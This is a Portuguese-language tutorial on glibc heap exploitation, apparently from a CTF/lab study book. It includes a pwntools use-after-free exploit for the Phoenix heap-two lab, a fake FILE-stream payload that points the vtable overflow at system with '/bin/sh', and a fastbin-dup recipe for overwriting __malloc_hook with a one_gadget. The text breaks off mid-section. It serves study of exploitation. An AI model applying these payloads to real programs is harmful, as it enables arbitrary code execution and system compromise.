<li><a href="https://heap-exploitation.dhavalkapil.com/">dhavalkapil: Heap Exploitation book</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">SploitFUN: sbrk</a> </li>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">SploitFUN: Malloc</a> </li>
<li><a href="https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html">GNU: malloc hooks</a></li>
<li><a href="https://linux.die.net/man/3/__malloc_hook">man: __malloc_hook</a></li>
<li><a href="https://stackoverflow.com/questions/120627/is-there-a-way-to-redefine-malloc-at-link-time-on-windows">stackoverflow: Is there a way to redefine malloc at link time on Windows?</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><pre><code>2ef5c8cae179b2d1dcd9c94fec99254acc18e1db6340048293591d98aee2cadf  phoenix/amd64/heap-two
</code></pre>
<pre><code class="language-py">#!/usr/bin/python
from pwn import *
io = process(&quot;/opt/phoenix/amd64/heap-two&quot;)

def leak(report=True):
    io.recvuntil(&quot;auth = &quot;)
    leak_auth = int(io.recvuntil(',').split(',')[0], 16)
    io.recvuntil(&quot;service = &quot;)
    leak_serv = int(io.recvuntil(']\n').split(&quot;]&quot;)[0], 16)
    if report: 
        log.info(&quot;[ auth = {}, service = {} ]&quot;.format(hex(leak_auth), hex(leak_serv)))
    io.sendline(b&quot;&quot;)
    return (leak_auth, leak_serv)
def auth(name=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;auth &quot; + name)
def service(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;service&quot; + extra)
def reset(extra=b''):
    (leak_auth, leak_serv) = leak(False)
    log.info(&quot;Called free on &quot;+hex(leak_auth))
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;reset&quot; + extra)
def login(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;login&quot; + extra)
    log.success(io.recvuntil(&quot;\n&quot;))

##################################################
auth(b&quot;A&quot;*32) # pointer auth
reset() # free, mas o pointer nao e destruido
service(b&quot;B&quot;*32) # Alloc overlap
leak()
login() # pointer usado after free, apontando para service
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>Coisas uteis pra atacar o heap mas que nao sao exatamente exclusivas aos 
ataques ao heap...</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/relacionados/io_list_all.html#teoria">Teoria</a>
<ul>
<li><a href="heap/relacionados/io_list_all.html#intro">Intro</a></li>
<li><a href="heap/relacionados/io_list_all.html#struct">Struct</a></li>
<li><a href="heap/relacionados/io_list_all.html#campos">Campos</a></li>
<li><a href="heap/relacionados/io_list_all.html#offsets">Offsets</a></li>
</ul>
</li>
<li><a href="heap/relacionados/io_list_all.html#exploit">Exploit</a></li>
</ul>
<h1 id="teoria-5"><a class="header" href="#teoria-5">Teoria</a></h1>
<h2 id="intro-1"><a class="header" href="#intro-1">Intro</a></h2>
<p>No linux, para interagir com os <code>IO</code>s nao se usa o <code>file descriptors (fd)</code> 
padrões diretamente, e sim por meio de <code>file streams</code>. Esses sao wrappers que 
trazem funcionalidade adicional como por exemplo: <code>IO buffers</code></p>
<p>Um programa sempre possui 3 file streams, mesmo que nao use input nem output, 
esses sao os <code>stdIOs</code>: <code>stdin</code>, <code>stdout</code> e <code>stderr</code>. Isso quer dizer que essa 
técnica funciona praticamente universalmente! :D</p>
<p>Porem com a evolução de C para C++ , as file streams receberam mais um upgrade: 
agora elas possuem <code>file stream + vtable</code>. Essa <code>vtable</code> possui funcionalidades 
que tornam IO mais fluido.</p>
<p>Por exemplo, quando o programa esta encerrando, para limpar os buffers, a 
função <code>overflow</code> é chamada. </p>
<p>Porem como C++ depende muito em C, essas file streams melhoradas foram 
adicionados ao LibC, ie portanto elas estão sempre presente em todos programas 
que dependem de C...</p>
<p>Se nos apontarmos essa <code>vtable</code> para uma vtable falsa, podemos alterar o 
<code>overflow</code> e quando o programa encerrar, ganhar execução de código!</p>
<h2 id="struct"><a class="header" href="#struct">Struct</a></h2>
<p>As files streams sao definidas por:</p>
<pre><code class="language-C">pwndbg&gt; p *_IO_list_all 
$2 = {
  file = {
    _flags = -72540026,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fd57b9fb680 &lt;_IO_2_1_stdout_&gt;,
    _fileno = 2,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = &quot;&quot;,
    _lock = 0x7fd57b9fc7b0 &lt;_IO_stdfile_2_lock&gt;,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7fd57b9fa760 &lt;_IO_wide_data_2&gt;,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' &lt;repeats 19 times&gt;
  },
  vtable = 0x7fd57b9f7420 &lt;__GI__IO_file_jumps&gt;
}
pwndbg&gt; p *_IO_list_all.vtable 
$3 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x7fd57b6c08a0 &lt;_IO_new_file_finish&gt;,
  __overflow = 0x7fd57b6c12f0 &lt;_IO_new_file_overflow&gt;,
  __underflow = 0x7fd57b6c0f70 &lt;_IO_new_file_underflow&gt;,
  __uflow = 0x7fd57b6c22c0 &lt;__GI__IO_default_uflow&gt;,
  __pbackfail = 0x7fd57b6c3620 &lt;__GI__IO_default_pbackfail&gt;,
  __xsputn = 0x7fd57b6c04a0 &lt;_IO_new_file_xsputn&gt;,
  __xsgetn = 0x7fd57b6c0070 &lt;__GI__IO_file_xsgetn&gt;,
  __seekoff = 0x7fd57b6bf880 &lt;_IO_new_file_seekoff&gt;,
  __seekpos = 0x7fd57b6c26a0 &lt;_IO_default_seekpos&gt;,
  __setbuf = 0x7fd57b6bf160 &lt;_IO_new_file_setbuf&gt;,
  __sync = 0x7fd57b6befe0 &lt;_IO_new_file_sync&gt;,
  __doallocate = 0x7fd57b6b32e0 &lt;__GI__IO_file_doallocate&gt;,
  __read = 0x7fd57b6c0480 &lt;__GI__IO_file_read&gt;,
  __write = 0x7fd57b6bfe70 &lt;_IO_new_file_write&gt;,
  __seek = 0x7fd57b6bf5b0 &lt;__GI__IO_file_seek&gt;,
  __close = 0x7fd57b6bf150 &lt;__GI__IO_file_close&gt;,
  __stat = 0x7fd57b6bfe60 &lt;__GI__IO_file_stat&gt;,
  __showmanyc = 0x7fd57b6c37a0 &lt;_IO_default_showmanyc&gt;,
  __imbue = 0x7fd57b6c37b0 &lt;_IO_default_imbue&gt;

</code></pre>
<h2 id="campos"><a class="header" href="#campos">Campos</a></h2>
<p>Relevante para nos temos: </p>
<ul>
<li>chain
<ul>
<li>Aponta para a proxima file stream assim, formando um singly linked list.
<ul>
<li>Normalmente contendo os <code>std IO</code>s</li>
</ul>
</li>
<li>Nos podemos altera-lo e apontar para o heap, e no heap criar uma file stream falsa.</li>
</ul>
</li>
<li>Vtable
<ul>
<li>overflow: podemos apontar para um one_gadget ou system</li>
</ul>
</li>
<li>Flags
<ul>
<li>Quando forjamos uma file stream falsa e chamamos <code>overflow</code>, <code>flags</code> sera 
passado por meio do <code>RDI</code>.</li>
<li>Assim podemos colocar <code>flags = /bin/sh</code> e <code>overflow = system</code> </li>
</ul>
</li>
<li>Proteções: No futuro provavelmente vai ter mais, mas no mínimo voce deve esperar:
<ul>
<li>write_ptr &gt; write_base</li>
<li>mode = 0
<ul>
<li>obs: os primeiros 4 bytes de mode podem ser afetados por ASLR, tornando seu exploit funcional apenas 50% da vezes.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="offsets"><a class="header" href="#offsets">Offsets</a></h2>
<ul>
<li>
<p>File: 0x20</p>
<ul>
<li>flags: 0x0 </li>
<li>write_base: 0x20</li>
<li>write_ptr: 0x28</li>
<li>chain: 0x68</li>
<li>mode: 0xc0</li>
</ul>
</li>
<li>
<p>Vtable: 0xd0</p>
<ul>
<li>Overflow: 0x18 (em realacao a vtable)</li>
</ul>
</li>
</ul>
<h1 id="exploit-3"><a class="header" href="#exploit-3">Exploit</a></h1>
<p>Então recapitulando, nos podemos forjar uma file stream falsa no heap ou stack, 
e apontar <code>_IO_list_all</code> ou alguma das <code>chain</code>s para ela.</p>
<p>Alem disso, podemos simplesmente alterar a <code>vtable</code> ou somente o <code>overflow dentro da vtable </code> de um dos <code>std IO</code>s.</p>
<p>Nos caso mais complexo, caso tenhamos um pointer para a nossa file stream falsa 
podemos apontar <code>_IO_list_all</code> para <code>pointer - 0x68</code>, fazendo com que o segundo 
item na <code>linked list formada pelas chains</code> seja a nossa file stream falsa.</p>
<p>A nossa file stream falsa precisa conter valores que passem pelas restrições 
mencionadas anteriormente e possua uma vtable falsa que aponte o seu overflow 
para system. Assim, quando o programa sair, nos conseguiremos uma shell.</p>
<p>A maior parte dos outros valores nao importam, portanto uma file stream falsa 
poderia ser definida por:</p>
<pre><code class="language-py">flat(
    b&quot;/bin/sh\0&quot;,#                    flags | 0x00
    0,0,0,
    1,#                          write base | 0x20
    2,#                           write ptr | 0x28
    '\0'*8*20,#   mode ta no meio desses 0s
    libc.sym.system,#              overflow | 0xc8
    fake_file_stream +0xc8 -0x18,#   vtable | 0xd0
)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>Nos tutoriais a seguir voce aprendera técnicas para atacar o alocador de 
memoria do libc: malloc</p>
<p>Porem, nao pense nao técnicas como: receitinhas que funcionam numa versão 
especifica do libc</p>
<p>Pense nelas como conceitos gerais e abstratos, que podem ser aplicados em 
outros alocadores de memoria... O malloc costuma ser o alvo mais comum para 
pesquisadores pois é o alocador que teve mais medidas de seguranca adicionadas.</p>
<p>obs: isso nao quer dizer que é o mais seguro, ok? ok!</p>
<p>Por exemplo, voce pode interpretar as diferentes técnicas como: o que acontece 
se eu alterar esse pedaço de meta-dados deixando-o grande? e pequeno? e zero? 
E aquele outro pedaço de meta-dados, e se eu mudar ele?.... etc etc</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="teoria-6"><a class="header" href="#teoria-6">Teoria</a></h1>
<ul>
<li><a href="heap/malloc/teoria.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/teoria.html#chunk">Chunk</a></li>
<li><a href="heap/malloc/teoria.html#top">Top</a></li>
<li><a href="heap/malloc/teoria.html#arena">Arena</a></li>
<li><a href="heap/malloc/teoria.html#binlists">Binlists</a>
<ul>
<li><a href="heap/malloc/teoria.html#fastbins">Fastbins</a></li>
<li><a href="heap/malloc/teoria.html#unsorted-bin">Unsorted bin</a>
<ul>
<li><a href="heap/malloc/teoria.html#remaindering">Remaindering</a></li>
</ul>
</li>
<li><a href="heap/malloc/teoria.html#small-bins">Small Bins</a></li>
<li><a href="heap/malloc/teoria.html#large-bins">Large Bins</a></li>
</ul>
</li>
<li><a href="heap/malloc/teoria.html#outras-opera%C3%A7%C3%B5es">Outras operações</a></li>
</ul>
<p>O Heap é composto por chunks, alocados por meio de <code>malloc()</code> e liberados por meio de <code>free()</code>.</p>
<p>Malloc recebe normalmente 1 parâmetro: tamanho! Porem esse valor a esse valor é 
adicionado <code>0x08</code> e arredondado para cima. Por exemplo:</p>
<ul>
<li>malloc(0x18) -&gt; 0x20 -&gt; 0x20</li>
<li>malloc(0x20) -&gt; 0x28 -&gt; 0x30</li>
<li>malloc(1)    -&gt; 0x20 TAMANHO MINIMO!</li>
</ul>
<p>Esse é o tamanho (<code>size</code>) do chunk!</p>
<h1 id="chunk"><a class="header" href="#chunk">Chunk</a></h1>
<p>O chunk, quando alocado consiste em:</p>
<pre><code>0000000000000000        size      -&gt; Lembrando que size inclui os metadados
0000000000000000 0000000000000000 &lt;- dados do usuário
0000000000000000 0000000000000000
</code></pre>
<p>A visão do usuário e a visão interna de um chunk sao diferentes:</p>
<pre><code class="language-x86asm">0000000000000000 0000000000000031 &lt;- visão malloc
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB &lt;- visão usuário
CCCCCCCCCCCCCCCC EEEEEEEEEEEEEEEE
FFFFFFFFFFFFFFFF 0000000000000020 &lt;- visão malloc
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB &lt;- visão usuário
CCCCCCCCCCCCCCCC 
</code></pre>
<p>Nos vamos usar a visão do malloc daqui em diante! Portanto:
<code>Chunk + 0x08 -&gt; size</code> e <code>Chunk + 0x10 -&gt; dados</code> </p>
<p>O tamanho do chunk, por ser alinhado a 16 bytes, nas usa os últimos 4 bits do size,
e assim eles sao usados pra flags:</p>
<ul>
<li>1 - PREV_INUSE
<ul>
<li><code>1</code> se o <code>chunk adjacente anterior</code> esta em uso (nao free)</li>
<li>Se o <code>chunk anterior</code> esta livre (<code>0</code>), o nosso chunk rouba a ultima qword (a 
logo antes do <code>size</code>) para armazenar o <code>size do chunk anterior</code>: <code>PREV_SIZE</code></li>
</ul>
</li>
<li>2 - IS_MMAPPED
<ul>
<li><code>1</code> se o chunk foi adquirido via <code>mmap</code> </li>
<li>Os outros bits sao ignorados pois: 
<ul>
<li>Nao possui chunks adjacente</li>
<li>Nao faz parte de uma arena</li>
</ul>
</li>
</ul>
</li>
<li>4 - NON_MAIN_ARENA
<ul>
<li><code>0</code> se esta na <code>main_arena</code></li>
<li><code>1</code> se esta em qualquer outra thread</li>
</ul>
</li>
<li>8 - Sem uso atualmente</li>
</ul>
<h1 id="top"><a class="header" href="#top">Top</a></h1>
<p>O chunk <code>top</code> fica na borda do heap:</p>
<pre><code class="language-x86asm">0000000000000000 0000000000000031 &lt;- chunk 1
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB
CCCCCCCCCCCCCCCC EEEEEEEEEEEEEEEE 
FFFFFFFFFFFFFFFF 0000000000000020 &lt;- chunk 2
AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB
CCCCCCCCCCCCCCCC 0000000000003f41 &lt;- top
</code></pre>
<p>O top chunk tem um tamanho enorme, e quando nos alocamos um novo chunk, estamos 
tirando uma fatia dele.</p>
<p>Se ele ficar pequeno de mais, pode ser extendido por meio da syscall <code>sbrk</code> (system 
break)</p>
<p>O system break é um limite de quanta memoria nos podemos gastar, e é controlado pelo 
sistema operacional.</p>
<p>Alem disso, caso o chunk que passe do limite do <code>top</code> seja enorme (0x5000 por 
exemplo) ao envés de gastar o <code>top</code> todo e precisar chamar <code>srbk</code>, basta alocar o 
espaço desse chunk em outro canto usando <code>mmap</code>.</p>
<h1 id="arena"><a class="header" href="#arena">Arena</a></h1>
<p>Uma arena é um agregador de metadados referentes a aquele heap, com cada thread tendo
uma. A da main thread é chamada de <code>main_arena</code> !</p>
<p>Entre os metadados armazenados nos temos, por exemplo:</p>
<ul>
<li>Endereço do top chunk</li>
<li>Head das binlists</li>
<li>Pointer para outras arenas</li>
<li>Quanta memoria o sistema operacional disponibilizou</li>
</ul>
<p>A main_arena é uma variável global, enquanto as outras sao segmentos de heap!</p>
<p>O comportamento do <code>top</code> descrito anteriormente somente ocorre na main_arena</p>
<h1 id="binlists"><a class="header" href="#binlists">Binlists</a></h1>
<p>Quando um chunk nao é mais util, voce pode chamar <code>free()</code> passando o chunk como 
parâmetro!</p>
<p>Quando um chunk é liberado, ele é colocado em uma binlist e a sua estrutura muda!</p>
<p>Binlists sao linked lists (single ou double | circular ou nao circular) que 
armazenam os free chunks, com cada chunk sendo um node na list.</p>
<p>Sao as head dessas binlists que sao armazenadas na main arena!</p>
<p>Elas sao classificadas pelo tamanho do chunk que armazenam:</p>
<ul>
<li>Fastbins: 0x20, 0x30,....., 0x80</li>
<li>Unsorted bin: * </li>
<li>smallbins</li>
<li>largebins</li>
</ul>
<h3 id="fastbins"><a class="header" href="#fastbins">Fastbins</a></h3>
<p>Os fastbins sao usados para rapidamente alocar e liberar chunks.</p>
<p>Cada um deles contem uma singly-linked-list de chunks de mesmo tamanho. </p>
<p>O local aonde ficaria os <code>dados</code>, em um free chunk sera usado para metadados, e 
no caso dos fastbins, por ser uma singly-linked-list somente um pointer (<code>FD</code>) para 
o proximo chunk na lista.</p>
<p>Alem disso, essa lista é nao circular, isto é: o ultimo chunk tem FD=0 (NULL)</p>
<p>Como os fastbins nao sao consolidados com outros free chunks adjacentes, eles sempre
possuem <code>PREV_INUSE</code>=<code>1</code></p>
<p>Então por exemplo um chunk do fastbin 0x30 contem: </p>
<pre><code class="language-x86asm">0000000000000000     size=0x31
        FD       0000000000000000
0000000000000000 0000000000000000
0000000000000000
</code></pre>
<p>Alem disso, os fastbins sao <code>LIFO</code>, assim como uma stack:</p>
<pre><code class="language-C++">head: chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

free(chunk 4)
head: chunk 4 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

malloc()
head: chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

free(chunk 5)
head: chunk 5 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

free(chunk 10)
head: chunk 10 -&gt; chunk 5 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)

malloc()
head: chunk 5 -&gt; chunk 1 -&gt; chunk 3 -&gt; 0 (NULL)
</code></pre>
<p>Então por exemplo:</p>
<pre><code class="language-C++">Código:
malloc() 6 vezes
free(Chunk 4)
free(Chunk 2)
free(Chunk 5)
free(Chunk 3)

Main Arena:
Fastbin 0x20 = &amp; Chunk 3   
Fastbin 0x20 : Chunk 3 -&gt; Chunk 5 -&gt; Chunk 2 -&gt; Chunk 4 -&gt; 0 (NULL)

Heap:
0000000000000000 0000000000000021 &lt;- Chunk 1
0000000000000000 0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 2 - Fastbin 0x20 [3]
    &amp; Chunk 4    0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 3 - Fastbin 0x20 [4]
    &amp; Chunk 5    0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 4 - Fastbin 0x20 [0]
   00000 (NULL)  0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 5 - Fastbin 0x20 [1]
    &amp; Chunk 2    0000000000000000
0000000000000000 0000000000000021 &lt;- Chunk 6
0000000000000000 0000000000000000
0000000000000000 0000000000003d11 &lt;- top
</code></pre>
<h3 id="unsorted-bin"><a class="header" href="#unsorted-bin">Unsorted bin</a></h3>
<p>O unsorted bin armazena chunks de tamanho diversos, que serão distribuídos 
(<strong>SORT</strong>) para uma <code>small</code>/<code>large</code> bin de tamanho apropriado</p>
<p>A Unsorted bin é uma doubly linked list (<code>FD</code> e <code>BK</code>) circular!</p>
<p>Na hora de procurar um chunk de tamanho adequado para um <code>malloc()</code>, começa-se 
a busca pela <code>tail</code> e somente retorna um chunk de tamanho idêntico 
(<code>exact fit</code>) ao pedido! </p>
<p>Conforme essa lista vai sendo atravessada, o processo de <strong>SORT</strong> vai ocorrer!</p>
<p>Quando o chunk de tamanho correto é encontrado, ele sofre um 
<a href="https://0xturazzi.github.io/book/heap/malloc/PartialUnlink.html">parcial unlink</a> !</p>
<h4 id="remaindering"><a class="header" href="#remaindering">Remaindering</a></h4>
<p>Caso a busca chegue no <code>ultimo chunk do unsorted bins</code> e ele seja maior do que 
o pedido, ele sera dividido em 2 em um processo chamado <code>remaindering</code>:</p>
<pre><code> _________
|    |size|
| FD | BK |
|         |
|         |
|         |
|         |
|         |
|         |
|         |
|         |
|_________|

Divide o chunk em 2
 _________
|    |size|
| FD | BK |
|         |
|         |
|         |
|_________|
|         |
|         |
|         |
|         |
|_________|

Retorna o primeiro

Coloca o segundo no unsortedbin e 
      o define como last_remainder 
      (pointer na main_arena que 
      aponta para o ultimo chunk
      a ser dividido) 
 _________
|    |size| &lt;- Nosso chunk
|  dados  |
| AAAAAAA |
|         |
|         |
|_________|
|    |size| &lt;-- Unsorted Bins e last_remainder
| FD | BK |
|         |
|         |
|_________|

</code></pre>
<h3 id="small-bins"><a class="header" href="#small-bins">Small Bins</a></h3>
<p>Os small bins sao similares ao unsorted bin, sendo 
<code>double-linked -lists</code> (fd e bk) e circulares. Com essa lista 
sendo <code>FIFO</code>(<code>first-in first-out</code>), os chunks <code>entram/free</code> pela <br />
head e <code>saem/malloc</code> pela tail.</p>
<p>Cada small bins armazena somente um tamanho especifico de chunk, 
de <code>0x20</code> a <code>0x3f0</code>. Como voce pode perceber, existe uma 
intercessão entre os tamanhos de fast e small. Nos podemos 
migrar um fast chunk para o unsorted bins (e consequentemente para 
o respectivo small bins usando malloc consolidate())</p>
<h3 id="large-bins"><a class="header" href="#large-bins">Large Bins</a></h3>
<p>Os Large Bins sao:</p>
<ul>
<li>size &gt;= 0x400</li>
<li>Double linked lists (fd e bk)</li>
<li>Listas Circulares
Existem 64, com apenas 63 sendo usados 
<ul>
<li>Large 0x400: 0x400, 0x410, 0x420 e 0x430</li>
<li>Large 0x440: 0x440, 0x450, 0x460 e 0x470</li>
<li>...</li>
</ul>
</li>
</ul>
<p>Quanto maior o size, mais tamanhos de chunks ele armazena, em uma escala 
logarítmica</p>
<ul>
<li>Large 0x400: 0x400, 0x410, 0x420 e 0x430</li>
<li>Large 0x5000: 0x5000, 0x5010, ... , 0x5ff0</li>
<li>Large 0x80000: size &gt;= 0x80000 (teoricamente infinito)</li>
</ul>
<p>Os chunks ficam em ordem decrescente de tamanho em relação a head:</p>
<p><code>head:&gt; 0x430 --- 0x420 --- 0x410 --- 0x400 &lt;:tail</code> </p>
<p>Para manter essa ordem de tamanho, sao usadas skiplists, explicadas depois.</p>
<p>Os primeiros chunks de cada size, alem de <code>fd</code> e <code>bk</code>, possuem <code>fd_nextsize</code> 
e<code>fd_nextsize</code>. Esses chunks que contem metadados adicionais sao chamados de 
skipchunks</p>
<pre><code class="language-py">head:  0x430  0x430     0x420   0x420   0x410     0x400   0x400 :tail
 ...&gt;|      |&gt;|     |&gt;|      |&gt;|     |&gt;|      |&gt;|      |&gt;|     |&gt;... fd
 ...&lt;| skip |&lt;|     |&lt;| skip |&lt;|     |&lt;| skip |&lt;| skip |&lt;|     |&lt;... bk
        ^ |              ^ |              ^ |      ^ |
.....___| |______________| |______________| |______| |___________.....
            fd_nextsize      fd_nextsize               fd_nextsize

E mesma coisa com o bk_nextsize.

Com o fd_nextsize apontando para um tamanho MENOR
Com o bk_nextsize apontando para um tamanho MAIOR
</code></pre>
<p>Assim, os <code>fd_nextsize</code> e <code>fd_nextsize</code> formam uma 
<code>doubly linked circular list</code>, contendo a primeira instancia de cada tamanho de 
chunk presente naquele largebin. Essa &quot;meta-lista&quot; é a skiplist :D</p>
<p>Quando um chunk de tamanho novo é <code>free()</code>, ele é colocado na skiplist do 
respectivo largebin. Em seguida, todos os chunks com aquele tamanho, serão 
colocados logo apos o primeiro, sem interferir com a skiplist.</p>
<p>Mesma coisa com alocações, com o chunk retirado sendo o mais recente a entrar 
naquela skiplist (<code>LIFO</code>). Portanto o skipchunk sera o ultimo a ser 
alocado entre os chunks daquele tamanho. Assim, nao interferindo com a 
skiplist. </p>
<p>Assim, garantindo a ordem de tamanhos dentro de um largebin :D </p>
<blockquote>
<p>Obs: Quando um chunk <strong>NAO</strong> skipchunk é sort para um large bin, os seus 
bk_nextsize e fd_nextsize SAO <strong>NULLIFICADOS</strong></p>
</blockquote>
<blockquote>
<p>Obs 2: o unlink nos largebins ocorre pelo fd, para evitar 
alocar o skipchunk. E alem disso eles sempre sofrem um unlink <strong>COMPLETO</strong>,
pois o chunk pode vir do meio da lista! (safe unlink)</p>
</blockquote>
<h1 id="outras-operações"><a class="header" href="#outras-operações">Outras operações</a></h1>
<ul>
<li><code>calloc( size )</code>: igual <code>malloc()</code> porem inicializa a região para NULL
<ul>
<li>Ineficiente porem mais seguro</li>
</ul>
</li>
<li><code>realloc( chunk , size )</code>: muda o tamanho de um chunk
<ul>
<li>Chama <code>free()</code> no chunk, <code>malloc()</code> um novo chunk de tamanho <code>size</code> e transfere os dados do chunk antigo para o novo</li>
<li>Se <code>size == 0</code>, simplesmente atua como um <code>free()</code>: muitos devs nao sabem disso
<ul>
<li>Sanitizam os <code>free()</code>s corretamente, mas esquecem de sanitizar os <code>realloc()</code>s</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fastbins-dup"><a class="header" href="#fastbins-dup">Fastbins Dup</a></h1>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#fastbins-dup">Fastbins Dup</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/fastbinsDup.html#ataques">Ataques</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#alocar-um-chunk">Alocar um chunk</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#obs-__malloc_hook">Obs: __malloc_hook</a></li>
</ul>
</li>
<li><a href="heap/malloc/fastbinsDup.html#exec">Exec</a></li>
<li><a href="heap/malloc/fastbinsDup.html#escrever-um-valor-na-main_arena">Escrever um valor na main_arena</a></li>
<li><a href="heap/malloc/fastbinsDup.html#alocar-um-chunk-na-main_arena">Alocar um chunk na main_arena</a>
<ul>
<li><a href="heap/malloc/fastbinsDup.html#exemplo-malloc-antigo">Exemplo malloc antigo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="teoria-7"><a class="header" href="#teoria-7">Teoria</a></h2>
<p>Se o chunk tiver nos fastbins (<code>0x20</code> a <code>0x80</code>), voce pode passar 
pelas mitigações de double free.</p>
<p>Se:</p>
<ul>
<li>free chunk_A</li>
<li>free chunk_A</li>
</ul>
<p>As mitigações vao ser ativadas... porem se:</p>
<ul>
<li>free chunk_A</li>
<li>free chunk_B</li>
<li>free chunk_A</li>
</ul>
<p>Voce consegue linkar o chunk_A duas vezes em um fastbin (double free).</p>
<h2 id="ataques"><a class="header" href="#ataques">Ataques</a></h2>
<h3 id="alocar-um-chunk"><a class="header" href="#alocar-um-chunk">Alocar um chunk</a></h3>
<p>Os fastbins sao linkados numa <code>single-linked-list</code>, portanto somente usa 
o <code>fd</code>. Então, o <code>fd</code> fica na <strong>PRIMEIRA QWORD</strong> do parte dos dados.</p>
<ul>
<li>Double free
<ul>
<li>free chunk_A</li>
<li>free chunk_B</li>
<li>free chunk_A</li>
</ul>
</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
</ul>
<blockquote>
<p>head : Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_B = malloc()</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>edit(chunk_A, <strong>ALVO</strong>)</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; ALVO</p>
</blockquote>
<ul>
<li>malloc()</li>
</ul>
<blockquote>
<p>head : ALVO</p>
</blockquote>
<blockquote>
<p>O Proximo malloc ira alocar um chunk em ALVO</p>
</blockquote>
<ul>
<li>alvo = malloc()</li>
<li>edit(alvo, blablabla)</li>
</ul>
<blockquote>
<p>Nos temos um write arbitrário</p>
</blockquote>
<p>Porem existe uma excesso, o <strong>ALVO + 0x8</strong> precisa ser <strong>IGUAL AO TAMANHO DO FASTBIN</strong></p>
<p>Assim, se for o <code>fastbin 0x60</code>,  <code>ALVO + 0x8 == 0x60</code></p>
<p>Para achar um chunk que se encaixa nesses critérios, voce pode usar<br />
<code>find_fake_fast</code> no <code>pwntools</code></p>
<h4 id="obs-__malloc_hook"><a class="header" href="#obs-__malloc_hook">Obs: __malloc_hook</a></h4>
<p>Normalmente o malloc_hook so pode ser corrompido por um chunk de tamanho <code>7f</code>,
assim, o seu fastbin dup tem que ser no fastbin <code>0x70</code>!</p>
<h3 id="exec"><a class="header" href="#exec">Exec</a></h3>
<p>Nos podemos, por exemplo, fazer o anterior com <strong>ALVO = __malloc_hook</strong></p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
<li>edit(chunk_A, <strong>__malloc_hook</strong>)</li>
<li>malloc()</li>
<li>alvo = malloc()</li>
<li>edit(alvo, one_gadget)</li>
<li>malloc() <strong>ativar o hook</strong></li>
</ul>
<h3 id="escrever-um-valor-na-main_arena"><a class="header" href="#escrever-um-valor-na-main_arena">Escrever um valor na main_arena</a></h3>
<p>O valor das <code>head</code>s fica armazenado na <code>main_arena</code>, assim invés de 
colocar um endereço em <code>alvo</code>, podemos colocar um valor:</p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>edit(chunk_A, <strong>0x123</strong>)</li>
<li>malloc()</li>
</ul>
<blockquote>
<p>head : 0x123</p>
</blockquote>
<p>Com esse valor podemos facilitar outros tipo de exploit, por exemplo:</p>
<h3 id="alocar-um-chunk-na-main_arena"><a class="header" href="#alocar-um-chunk-na-main_arena">Alocar um chunk na main_arena</a></h3>
<p>Repetindo o anterior usando um Fastbin Dup no <code>0x60</code>:</p>
<ul>
<li>Double free</li>
</ul>
